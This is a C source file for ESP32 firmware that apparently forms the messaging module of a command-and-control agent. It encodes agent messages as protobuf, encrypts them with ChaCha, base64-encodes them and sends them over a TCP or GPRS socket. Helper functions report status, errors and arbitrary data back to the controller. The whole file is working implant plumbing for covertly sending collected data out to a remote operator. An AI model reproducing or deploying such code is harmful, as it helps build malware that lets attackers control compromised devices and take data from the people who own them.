#include <stdio.h>
#include <string.h>
#include <time.h>

#include "esp_log.h"
#include "lwip/sockets.h"

#include "pb_encode.h"
#include "c2.pb.h"

#include "utils.h"   /* base64_encode, chacha_cd, CONFIG_DEVICE_ID */

#define TAG "AGENT_MSG"
#define MAX_PROTOBUF_SIZE 512

extern int sock;

/* ============================================================
 * TCP helpers
 * ============================================================ */

 static bool tcp_send_all(const void *buf, size_t len)
 {
 #ifdef CONFIG_NETWORK_WIFI
 
     extern int sock;
 
     const uint8_t *p = (const uint8_t *)buf;
     while (len > 0) {
         int sent = lwip_write(sock, p, len);
         if (sent <= 0) {
             ESP_LOGE(TAG, "lwip_write failed");
             return false;
         }
         p   += sent;
         len -= sent;
     }
     return true;
 
 #elif defined(CONFIG_NETWORK_GPRS)
 
     return gprs_send(buf, len);
 
 #else
 #error "No network backend selected"
 #endif
 }
 
static bool send_base64_frame(const uint8_t *data, size_t len)
{
    char *b64 = base64_encode(data, len);
    if (!b64) {
        ESP_LOGE(TAG, "base64_encode failed");
        return false;
    }

    bool ok = tcp_send_all(b64, strlen(b64)) &&
              tcp_send_all("\n", 1);

    free(b64);
    return ok;
}

/* ============================================================
 * Encode → encrypt → base64 → send
 * ============================================================ */

static bool encode_encrypt_send(c2_AgentMessage *msg)
{
    uint8_t buffer[MAX_PROTOBUF_SIZE];

    pb_ostream_t stream =
        pb_ostream_from_buffer(buffer, sizeof(buffer));

    if (!pb_encode(&stream, c2_AgentMessage_fields, msg)) {
        ESP_LOGE(TAG, "pb_encode failed: %s",
                 PB_GET_ERROR(&stream));
        return false;
    }

    size_t proto_len = stream.bytes_written;

    uint8_t *cipher =
        (uint8_t *)chacha_cd(buffer, proto_len);
    if (!cipher) {
        ESP_LOGE(TAG, "chacha_cd failed");
        return false;
    }

    bool ok = send_base64_frame(cipher, proto_len);
    free(cipher);
    return ok;
}

/* ============================================================
 * Core send API
 * ============================================================ */

bool agent_send(c2_AgentMsgType type,
                const char *source,
                const char *request_id,
                const void *data,
                size_t len,
                bool eof)
{
    c2_AgentMessage msg = c2_AgentMessage_init_zero;

    /* mandatory */
    strncpy(msg.device_id, CONFIG_DEVICE_ID,
            sizeof(msg.device_id) - 1);
    msg.type = type;
    msg.eof = eof;

    /* optional */
    if (source) {
        strncpy(msg.source, source,
                sizeof(msg.source) - 1);
    }

    if (request_id) {
        strncpy(msg.request_id, request_id,
                sizeof(msg.request_id) - 1);
    }

    if (data && len > 0) {
        if (len > sizeof(msg.payload.bytes))
            len = sizeof(msg.payload.bytes);

        msg.payload.size = len;
        memcpy(msg.payload.bytes, data, len);
    }

    return encode_encrypt_send(&msg);
}

/* ============================================================
 * High-level helpers (USED EVERYWHERE)
 * ============================================================ */

bool msg_info(const char *src,
              const char *msg,
              const char *req)
{
    return agent_send(
        c2_AgentMsgType_AGENT_INFO,
        src,
        req,
        msg,
        msg ? strlen(msg) : 0,
        true
    );
}

bool msg_error(const char *src,
               const char *msg,
               const char *req)
{
    return agent_send(
        c2_AgentMsgType_AGENT_ERROR,
        src,
        req,
        msg,
        msg ? strlen(msg) : 0,
        true
    );
}

bool msg_data(const char *src,
              const void *data,
              size_t len,
              bool eof,
              const char *req)
{
    if (!data || len == 0)
        return false;

    return agent_send(
        c2_AgentMsgType_AGENT_DATA,
        src,
        req,
        data,
        len,
        eof
    );
}
